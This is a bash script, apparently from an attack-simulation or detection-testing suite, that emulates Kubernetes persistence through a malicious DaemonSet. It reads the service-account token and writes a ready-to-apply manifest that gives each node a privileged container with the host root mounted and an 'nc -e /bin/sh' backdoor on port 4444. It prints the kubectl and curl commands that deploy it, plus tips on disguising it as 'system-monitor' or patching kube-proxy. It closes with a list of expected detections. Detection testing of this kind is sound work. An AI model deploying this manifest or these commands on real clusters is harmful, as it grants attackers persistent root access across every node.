#!/bin/bash
# Attack: Malicious DaemonSet Deployment
# MITRE ATT&CK: Persistence - T1525
# Severity: CRITICAL
# Description: Deploys a malicious DaemonSet to ensure persistence across all cluster nodes
# Prerequisites: Kubernetes API access with DaemonSet creation permissions

set -e
echo "[+] Starting: Malicious DaemonSet Deployment"
echo "[+] MITRE ATT&CK: T1525 - Implant Internal Image"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Checking Kubernetes API access..."
K8S_API="https://kubernetes.default.svc"
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo "[+] Service account token available"
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
else
    echo "[!] No service account token found"
    echo "[*] This attack requires Kubernetes API access"
    exit 0
fi

echo ""
echo "[*] Step 2: Creating malicious DaemonSet manifest..."
DAEMONSET_YAML="/tmp/malicious-daemonset.yaml"
cat > "$DAEMONSET_YAML" << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: system-monitor
  namespace: kube-system
  labels:
    app: system-monitor
    component: monitoring
spec:
  selector:
    matchLabels:
      app: system-monitor
  template:
    metadata:
      labels:
        app: system-monitor
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: monitor
        image: alpine:latest
        command: ["/bin/sh"]
        args: ["-c", "while true; do nc -lvnp 4444 -e /bin/sh; sleep 10; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
          readOnly: false
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
EOF

echo "[+] Malicious DaemonSet manifest created"
echo "[*] This DaemonSet will:"
echo "    - Run on EVERY node in the cluster"
echo "    - Have privileged access"
echo "    - Mount host root filesystem"
echo "    - Use host network, PID, and IPC namespaces"
echo "    - Open reverse shell on port 4444"

echo ""
echo "[*] Manifest contents:"
cat "$DAEMONSET_YAML"

echo ""
echo "[*] Step 3: Testing API permissions..."
if command -v curl &> /dev/null && [ -f /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ]; then
    echo "[*] Checking if we can create DaemonSets..."

    # Test API access
    API_TEST=$(curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
                   -H "Authorization: Bearer $TOKEN" \
                   -s -o /dev/null -w "%{http_code}" \
                   "$K8S_API/apis/apps/v1/namespaces/kube-system/daemonsets" 2>/dev/null)

    echo "[*] API Response: $API_TEST"

    if [ "$API_TEST" = "200" ] || [ "$API_TEST" = "403" ]; then
        echo "[*] API is accessible (may lack permissions)"
    fi
fi

echo ""
echo "[*] Step 4: Deployment command..."
echo "[*] To deploy malicious DaemonSet:"
echo ""
echo "    kubectl apply -f $DAEMONSET_YAML"
echo ""
echo "[*] Or via API:"
echo "    curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \\"
echo "         -H 'Authorization: Bearer \$TOKEN' \\"
echo "         -H 'Content-Type: application/yaml' \\"
echo "         --data-binary @$DAEMONSET_YAML \\"
echo "         -X POST $K8S_API/apis/apps/v1/namespaces/kube-system/daemonsets"

echo ""
echo "[*] Step 5: Post-deployment impact..."
echo "[*] Once deployed, the DaemonSet will:"
echo "    1. Create a pod on EVERY worker node"
echo "    2. Each pod has full host access"
echo "    3. Backdoor listens on port 4444 on each node"
echo "    4. Survives node reboots"
echo "    5. Automatically deploys to new nodes"

echo ""
echo "[*] Step 6: Alternative - Modify existing DaemonSet..."
echo "[*] Attacker could modify legitimate DaemonSets:"
echo ""
echo "    kubectl patch daemonset kube-proxy -n kube-system --patch '{...}'"
echo ""
echo "[*] This allows hiding in plain sight"

echo ""
echo "[*] Step 7: Detection evasion techniques..."
echo "[*] To avoid detection, malicious DaemonSet uses:"
echo "    - Legitimate-sounding name: 'system-monitor'"
echo "    - kube-system namespace (trusted)"
echo "    - Common labels (app=monitoring)"
echo "    - Base Alpine image (small, common)"

echo ""
echo "[*] Cleanup simulation files..."
rm -f "$DAEMONSET_YAML"

echo ""
echo "[✓] Malicious DaemonSet simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Deploy to all cluster nodes"
echo "    - Provide backdoor access to entire cluster"
echo "    - Achieve cluster-wide persistence"
echo "    - Survive pod/node restarts"
echo "    - Enable lateral movement"
echo ""
echo "[!] Expected detections:"
echo "    - New DaemonSet in kube-system"
echo "    - Privileged containers"
echo "    - HostPath volume mounts"
echo "    - Host namespace usage"
echo "    - Suspicious network listeners"
